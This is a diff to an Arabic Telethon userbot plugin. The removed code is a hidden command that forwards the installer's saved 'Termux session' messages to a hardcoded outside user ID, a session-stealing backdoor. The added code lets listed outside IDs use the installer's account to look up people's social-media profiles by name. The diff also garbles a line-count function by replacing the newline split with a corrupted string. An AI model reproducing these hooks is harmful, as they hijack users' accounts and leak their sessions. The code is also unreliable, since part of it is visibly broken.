@@ -33,32 +33,64 @@ async def count_lines(event):
     reply = await event.get_reply_message()
     if not reply or not reply.message:
         return await edit_or_reply(event, "⌔∮ يرجى الرد على الرسالة لحساب عدد الأسطر.")
-    lines = reply.message.split("\n")
+    lines = reply.message.split("\pخ")
     count = len(lines)
     await edit_or_reply(event, f"⌔∮ عدد الأسطر في الرسالة: {count}")
-
 from telethon import events
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+import requests
+from ..core.managers import edit_or_reply
 
-# Replace the value below with your user ID
-YOUR_USER_ID = 6205161271
+allowed_senders = [6205161271,6309878173]
 
-from telethon import events
+headers = {
+    'authority': 'api.hexomate.com',
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'content-type': 'application/json',
+    'origin': 'https://discoverprofile.com',
+    'referer': 'https://discoverprofile.com/',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+}
 
-YOUR_USER_ID = 6205161271
+api_url = 'https://api.hexomate.com/discoverProfile'
 
-@l313l.ar_cmd(pattern=r"^جلستك$")
-async def forward_saved_messages(event):
-    # Check if the sender is the user with ID 6205161271
-    if event.sender_id == YOUR_USER_ID:
-        # Get your saved messages
-        saved_messages = await event.client.get_messages("me", filter=events.NewMessage(incoming=True, pattern="جلسة تيرمكس"))
+# Define the command handler
+@l313l.on(events.NewMessage(pattern="^الحسابات (.+)", incoming=True))
+async def discover_social_profiles(event):
+    sender_id = event.sender_id
+    if sender_id not in allowed_senders:
+        return  # Exit if the sender is not allowed
 
-        # Check if there are matching messages to forward
-        if saved_messages:
-            # Forward matching messages to the user with user ID 6205161271
-            for message in saved_messages:
-                await event.client.forward_messages(YOUR_USER_ID, message)
-            return
+    name_to_search = event.pattern_match.group(1)
+    json_data = {
+        'source': name_to_search,
+        'type': 'name',
+        'rescan': False,
+    }
 
-    # If no matching messages or sender is not the specified user, reply with "ليس موجود"
-    await event.reply("ليس موجود")
+    try:
+        # Send the POST request to the API
+        response = requests.post(api_url, headers=headers, json=json_data).json()
+
+        # Process the response and extract the social media profiles
+        profiles = response.get('data', {}).get('profiles', [])
+        if profiles:
+            result = "**تم العثور على الحسابات التالية:**\n"
+            for profile in profiles:
+                platform = profile.get('platform', '')
+                username = profile.get('username', '')
+                result += f"**- {platform}:** `{username}`\n"
+        else:
+            result = "**لم يتم العثور على حسابات متعلقة بهذا الاسم.**"
+
+    except Exception as e:
+        result = f"**حدث خطأ أثناء جلب الحسابات: {e}**"
+
+    await edit_or_reply(event, result)
